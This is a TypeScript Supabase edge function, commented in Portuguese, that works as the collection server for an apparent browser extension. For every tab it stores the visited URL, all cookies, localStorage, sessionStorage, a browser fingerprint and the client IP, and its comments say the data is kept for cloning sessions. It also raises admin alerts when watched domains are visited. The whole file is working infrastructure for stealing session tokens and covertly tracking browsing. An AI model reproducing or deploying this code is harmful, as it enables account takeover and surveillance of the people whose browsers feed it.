import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    if (req.method !== 'POST') {
      return new Response(JSON.stringify({ error: 'Method not allowed' }), {
        status: 405,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    const { 
      machine_id, 
      user_id,
      tab_id, 
      url, 
      domain, 
      title,
      action = 'heartbeat',
      // ✅ NOVOS CAMPOS PARA CLONAGEM
      cookies,
      local_storage,
      session_storage,
      browser_fingerprint,
      client_ip
    } = await req.json()

    // 🔧 VALIDAÇÃO DE TAMANHO (prevenir timeouts)
    const MAX_STORAGE_SIZE = 2 * 1024 * 1024; // 2MB por storage
    const localSize = JSON.stringify(local_storage || {}).length;
    const sessionSize = JSON.stringify(session_storage || {}).length;
    const cookiesSize = JSON.stringify(cookies || []).length;
    const totalSize = localSize + sessionSize + cookiesSize;

    console.log(`📊 Payload sizes: localStorage=${localSize}b, sessionStorage=${sessionSize}b, cookies=${cookiesSize}b, total=${totalSize}b`);

    // Validar tamanhos individuais
    if (localSize > MAX_STORAGE_SIZE) {
      console.error(`❌ localStorage too large: ${localSize} bytes (limit: ${MAX_STORAGE_SIZE})`);
      return new Response(JSON.stringify({ 
        error: 'localStorage exceeds size limit',
        size: localSize,
        limit: MAX_STORAGE_SIZE,
        hint: 'Consider filtering non-essential keys in extension'
      }), {
        status: 413, // Payload Too Large
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    if (sessionSize > MAX_STORAGE_SIZE) {
      console.error(`❌ sessionStorage too large: ${sessionSize} bytes (limit: ${MAX_STORAGE_SIZE})`);
      return new Response(JSON.stringify({ 
        error: 'sessionStorage exceeds size limit',
        size: sessionSize,
        limit: MAX_STORAGE_SIZE
      }), {
        status: 413,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    console.log('Session tracker received:', { 
      machine_id, 
      domain, 
      action,
      cookies_count: cookies?.length || 0,
      has_storage: !!(local_storage || session_storage),
      has_fingerprint: !!browser_fingerprint,
      client_ip: client_ip || 'not provided'
    });

    if (!machine_id || !tab_id || !domain) {
      return new Response(JSON.stringify({ error: 'Missing required fields' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Função auxiliar para normalizar URLs (origin + pathname, sem query/hash)
    const normalizeUrl = (urlString: string): string => {
      try {
        const urlObj = new URL(urlString);
        return urlObj.origin + urlObj.pathname;
      } catch {
        return urlString;
      }
    };

    if (action === 'heartbeat') {
      // ✅ SALVAR DADOS COMPLETOS PARA CLONAGEM
      const { error: upsertError } = await supabaseClient
        .from('active_sessions')
        .upsert({
          machine_id,
          // ✅ NÃO enviar user_id (não é necessário e causa erros de tipo)
          tab_id,
          url,
          domain,
          title,
          last_activity: new Date().toISOString(),
          is_active: true,
          
          // ✅ DADOS COMPLETOS PARA CLONAGEM
          cookies: cookies || [],
          local_storage: local_storage || {},
          session_storage: session_storage || {},
          browser_fingerprint: browser_fingerprint || {},
          client_ip: client_ip || null,
          
          // Metadados adicionais
          updated_at: new Date().toISOString()
        }, {
          onConflict: 'machine_id,tab_id'
        })

      if (upsertError) {
        console.error('Error upserting session:', upsertError);
        return new Response(JSON.stringify({ 
          error: 'Database error',
          details: upsertError.message 
        }), {
          status: 500,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        })
      }

      console.log(`✅ Session saved with complete data: ${cookies?.length || 0} cookies, storage: ${Object.keys(local_storage || {}).length} items`);

      // Buscar TODOS os domínios monitorados ativos para este domínio
      const { data: monitoredDomains, error: fetchError } = await supabaseClient
        .from('monitored_domains')
        .select('*')
        .eq('domain', domain)
        .eq('is_active', true);

      if (fetchError) {
        console.error('Error fetching monitored domains:', fetchError);
      } else if (monitoredDomains && monitoredDomains.length > 0) {
        console.log(`📋 Found ${monitoredDomains.length} monitored config(s) for domain: ${domain}`);

        const visitedNorm = normalizeUrl(url);
        console.log(`🔗 Visited URL normalized: ${visitedNorm}`);

        // Iterar por todas as configurações de monitoramento
        for (const config of monitoredDomains) {
          const fullUrlMonitored = config.metadata?.full_url;
          let shouldAlert = false;
          let matchType = 'domain';

          if (!fullUrlMonitored) {
            // Sem URL específica = alerta por domínio inteiro
            shouldAlert = true;
            matchType = 'domain';
            console.log(`✅ Match (domain-level) for config ID: ${config.id}`);
          } else {
            // Há URL específica configurada
            const monitoredNorm = normalizeUrl(fullUrlMonitored);
            console.log(`🎯 Monitored URL normalized: ${monitoredNorm}`);

            // Matching flexível:
            // 1) visitedNorm começa com monitoredNorm (ignora query params)
            // 2) Fallback: url original inclui full_url configurada
            if (visitedNorm.startsWith(monitoredNorm)) {
              shouldAlert = true;
              matchType = 'url_normalized';
              console.log(`✅ Match (normalized startsWith) for config ID: ${config.id}`);
            } else if (url.includes(fullUrlMonitored)) {
              shouldAlert = true;
              matchType = 'url_includes';
              console.log(`✅ Match (url includes) for config ID: ${config.id}`);
            } else {
              console.log(`❌ No match for config ID: ${config.id}`);
            }
          }

          if (shouldAlert) {
            // Verificar debounce: último alerta para este machine + domain + full_url
            const cooldownSeconds = config.alert_frequency || 20;
            const { data: recentAlert } = await supabaseClient
              .from('admin_alerts')
              .select('triggered_at')
              .eq('machine_id', machine_id)
              .eq('domain', domain)
              .gte('triggered_at', new Date(Date.now() - cooldownSeconds * 1000).toISOString())
              .order('triggered_at', { ascending: false })
              .limit(1)
              .maybeSingle();

            if (recentAlert) {
              console.log(`⏳ Cooldown active for config ID: ${config.id}, skipping alert`);
              continue;
            }

            console.log(`🚨 Creating alert for config ID: ${config.id}`);

            // Criar alerta
            const { error: alertError } = await supabaseClient
              .from('admin_alerts')
              .insert({
                alert_type: 'domain_access',
                machine_id,
                domain,
                url,
                metadata: {
                  title,
                  alert_frequency: config.alert_frequency,
                  alert_type: config.alert_type,
                  is_critical: config.alert_type === 'critical',
                  full_url_match: fullUrlMonitored || null,
                  match_type: matchType,
                  config_id: config.id,
                  // ✅ Incluir informação sobre dados disponíveis
                  session_data_available: {
                    cookies: cookies?.length || 0,
                    storage_items: Object.keys(local_storage || {}).length,
                    has_fingerprint: !!browser_fingerprint,
                    has_client_ip: !!client_ip
                  }
                }
              });

            if (alertError) {
              console.error('Error creating alert:', alertError);
            } else {
              console.log(`✅ Alert created successfully for config ID: ${config.id}`);
            }

            // Parar após primeiro match (evitar múltiplos alertas)
            break;
          }
        }
      }

    } else if (action === 'close') {
      // Marcar sessão como inativa
      const { error: updateError } = await supabaseClient
        .from('active_sessions')
        .update({ 
          is_active: false,
          updated_at: new Date().toISOString()
        })
        .eq('machine_id', machine_id)
        .eq('tab_id', tab_id)

      if (updateError) {
        console.error('Error closing session:', updateError);
        return new Response(JSON.stringify({ error: 'Database error' }), {
          status: 500,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        })
      }
      
      console.log(`✅ Session marked as inactive: ${machine_id}/${tab_id}`);
    }

    return new Response(JSON.stringify({ 
      success: true,
      message: action === 'heartbeat' ? 'Session data saved' : 'Session closed'
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    })

  } catch (error) {
    console.error('Session tracker error:', error);
    return new Response(JSON.stringify({ 
      error: 'Internal server error',
      message: error.message
    }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    })
  }
})